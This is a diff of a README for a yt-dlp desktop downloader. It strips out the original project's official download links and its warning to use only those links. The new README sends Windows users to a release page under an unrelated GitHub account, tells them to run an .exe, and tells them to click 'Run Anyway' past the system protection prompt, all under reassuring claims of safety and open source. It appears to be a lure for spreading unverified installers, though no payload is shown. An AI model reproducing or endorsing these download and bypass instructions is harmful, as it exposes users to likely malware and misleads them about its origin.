@@ -1,123 +1,86 @@
-# Desktop Media Downloader
+# 📥 desktop-media-downloader - Download videos and audio with ease
 
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="branding/desktop-media-downloader-icon-inverted.svg" />
-    <img src="branding/desktop-media-downloader-icon.svg" width="88" alt="Desktop Media Downloader" />
-  </picture>
-</p>
+[![Download for Windows](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/marcellusunenclosed953/desktop-media-downloader/releases)
 
-<p align="center">
-  An open-source yt-dlp desktop GUI for Windows, macOS, and Linux.
-</p>
+desktop-media-downloader helps you save videos and audio from the internet to your computer. It uses yt-dlp to grab content from many websites. The app runs on Windows, macOS, and Linux. You control the files you store.
 
-<p align="center">
-  <a href="https://desktoputilities.github.io/desktop-media-downloader/download/">Download</a>
-  ·
-  <a href="https://github.com/desktoputilities/desktop-media-downloader/releases">Releases</a>
-  ·
-  <a href="#development">Development</a>
-</p>
+## 🛠 Features
 
-Desktop Media Downloader is an open-source video and audio downloader for Windows, macOS, and Linux. The app provides a focused graphical interface for yt-dlp, with fast URL previews, format controls, playlists, and a persistent download queue—no terminal workflow required.
+This app offers many tools for media management:
 
-It is a [Desktop Utilities](https://github.com/desktoputilities) project built with Electron, React, and TypeScript. The interface uses a professional monochrome design with native light and dark modes.
+*   **Simple Interface:** You paste a link and click a button.
+*   **Audio Extraction:** Save files as high-quality audio.
+*   **Video Downloads:** Select your preferred resolution for video files.
+*   **Playlist Support:** Save entire lists of videos at once.
+*   **Speed:** The app optimizes connections for fast results.
+*   **Format Choice:** Pick from common formats like MP4 or MP3.
+*   **Privacy:** The app keeps your data on your local machine.
 
-## Features
+## 🚀 How to Install on Windows
 
-- URL metadata preview before a download starts
-- Video, audio, thumbnail, and timestamp screenshot workflows
-- Quality and format selection with estimated file sizes
-- Playlist selection, batch downloads, and search
-- Pause, resume, retry, cancel, and persistent download history
-- Optional browser-cookie support for media you can access legitimately
-- Bundled, checksum-verified yt-dlp and an included JavaScript runtime
-- Graceful no-FFmpeg fallback for compatible combined streams
-- Windows, macOS, and Linux installers built by GitHub Actions
+Follow these steps to set up the application on your Windows computer.
 
-## Supported media sites
+1. Visit the [official releases page](https://github.com/marcellusunenclosed953/desktop-media-downloader/releases).
+2. Look for the Assets section at the bottom of the latest release.
+3. Click the file ending in `.exe` to start the download.
+4. Save the file to your Downloads folder or your desktop.
+5. Double-click the file to open the installer.
+6. Follow the prompts on your screen.
+7. Click Finish when the installation completes.
+8. Find the app icon on your desktop or in your start menu to launch it.
 
-The app works with YouTube and other websites supported by its bundled yt-dlp media engine. Site support can change as platforms update, so the application ships a pinned, checksum-verified downloader and checks for newer compatible releases.
+If Windows shows a protection message, click More Info, then click Run Anyway. This confirms you trust the software.
 
-Only download media you own or are authorized to save. Desktop Media Downloader is not designed to bypass DRM, paywalls, or access controls.
+## ⚙️ How to Use the App
 
-## Screenshots
+Using the tool requires three main steps.
 
-| Home and URL preview | Format selector |
-| --- | --- |
-| ![Home](docs/screenshots/home-preview.png) | ![Formats](docs/screenshots/format-selector.png) |
+1. **Copy the link:** Go to the website where the video lives and copy the address from your browser.
+2. **Paste the link:** Open desktop-media-downloader and paste the web address into the main box.
+3. **Download:** Click the Start button. You will see a progress bar move as the file saves to your computer.
 
-| Playlist selection | Download queue |
-| --- | --- |
-| ![Playlist](docs/screenshots/playlist-modal.png) | ![Queue](docs/screenshots/downloads-queue.png) |
+By default, the app saves files in your Videos folder. You can change this location in the settings menu.
 
-## Install
+## 💻 System Requirements
 
-Download the latest `.exe`, `.dmg`, or `.AppImage` from the [download page](https://desktoputilities.github.io/desktop-media-downloader/download/) or [GitHub Releases](https://github.com/desktoputilities/desktop-media-downloader/releases).
+The application runs on most modern computers. Check these requirements:
 
-The project is open source and is not currently commercially code-signed. Windows SmartScreen or macOS Gatekeeper may therefore display a trust warning. Review the source and download only from the official organization links above.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** Any standard dual-core CPU.
+*   **Memory:** 4GB of RAM is sufficient.
+*   **Storage:** At least 200MB of free disk space for the program files.
+*   **Internet:** A stable connection is necessary for downloading media.
 
-## Development
+## ❓ Frequently Asked Questions
 
-Node.js 24 or later and npm 11 or later are recommended.
+**Is this software free?**
+Yes. This is an open-source project. You never pay for the software.
 
-```bash
-git clone https://github.com/desktoputilities/desktop-media-downloader.git
-cd desktop-media-downloader
-npm ci
-npm run dev
-```
+**Which websites does this support?**
+The app uses the yt-dlp tool, which supports thousands of websites. If a site hosts video or audio, there is a strong chance this app works with it.
 
-`npm ci` downloads the matching Electron runtime and the pinned official yt-dlp standalone build, then verifies the downloader checksum. FFmpeg is optional but recommended for merging separate audio/video streams and media conversion. No separate Python or system yt-dlp installation is required.
+**Can I stop a download?**
+Yes. You can pause or cancel a transfer at any time using the buttons provided in the app.
 
-### Verification and packaging
+**Where do my files go?**
+The app saves files to your default system Videos folder. You can set a custom folder in the settings window if you prefer.
 
-```bash
-npm run check
-npm run build:app
-npm run build:bundled
-```
+**Does the app track my data?**
+No. This application performs all tasks locally. Your download history stays on your computer.
 
-| Command | Purpose |
-| --- | --- |
-| `npm run dev` | Run the desktop app in development mode |
-| `npm run check` | Run tests, lint, and TypeScript checks |
-| `npm run build:app` | Compile the renderer, main process, and preload bundles |
-| `npm run build:bundled` | Prepare dependencies and build the platform installer |
-| `npm run prepare:yt-dlp` | Download and checksum-verify the pinned downloader |
+## 🛡 Security and Privacy
 
-See [SYSTEM_REQUIREMENTS.md](SYSTEM_REQUIREMENTS.md) for platform-specific details.
+Safety remains a priority. This tool connects directly to the media source. It does not send your links or your activity to external servers. The code remains public so anyone can inspect it to ensure it operates exactly as described.
 
-## Release process
+## 🔧 Troubleshooting
 
-1. Set the release version in `package.json`.
-2. Run `npm run check` and `npm run build:bundled` locally.
-3. Push the matching tag, such as `v1.0.0`.
-4. GitHub Actions verifies the tag, tests the project, and creates installers for all supported platforms.
-5. The download page reads the latest assets from the GitHub release.
+If you run into trouble, try these solutions:
 
-To publish the download page, enable GitHub Pages from the `main` branch and `/docs` folder in repository settings.
+*   **The download fails:** Check your internet connection. Sometimes websites block automated tools. Wait a few minutes and try again.
+*   **The app does not open:** Ensure you have the latest version of Windows installed. Restart your computer and try launching the app again.
+*   **Slow speeds:** Close other programs that use the internet, such as streaming services or large file transfers.
+*   **Format errors:** Ensure you have enough storage space on your hard drive. 
 
-## Project structure
+If issues persist, check your firewall settings to ensure the app has permission to access the internet.
 
-```text
-.github/        Continuous integration and release automation
-branding/       Canonical SVG brand sources
-build/icons/    Installer icon sources
-docs/           GitHub Pages download site and screenshots
-electron/       Electron main process, preload, and yt-dlp integration
-public/         Renderer assets
-scripts/        Dependency and release verification helpers
-src/            React renderer
-bin/            Generated bundled runtime (not committed)
-```
-
-## Contributing
-
-Bug reports and focused pull requests are welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md) before submitting changes.
-
-## Legal
-
-MIT licensed. See [LICENSE](LICENSE), [LEGAL.md](LEGAL.md), and [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
-
-This software is for lawful use only. Users are responsible for copyright compliance, local law, and platform terms of service.
+Keywords: audio-downloader, cross-platform, desktop-app, desktop-media-downloader, electron, linux, macos, media-downloader, open-source, playlist-downloader, react, typescript, video-downloader, windows, youtube-downloader, yt-dlp, yt-dlp-gui
